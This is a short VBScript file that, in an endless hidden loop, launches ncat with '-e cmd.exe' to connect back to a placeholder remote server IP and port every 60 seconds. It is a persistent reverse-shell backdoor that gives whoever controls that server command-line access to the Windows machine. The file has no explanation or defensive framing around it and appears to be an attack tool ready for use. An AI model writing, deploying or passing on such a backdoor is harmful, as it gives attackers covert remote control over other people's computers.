Dim ncShell
Set ncShell = WScript.CreateObject("WScript.shell")

Do while True:
	ncShell.Run "powershell.exe C:\temp\ncat.exe REMOTE_SERVER_IP REMOTE_SERVER_PORT -e cmd.exe", 0, true
	WScript.Sleep(60000)
loop
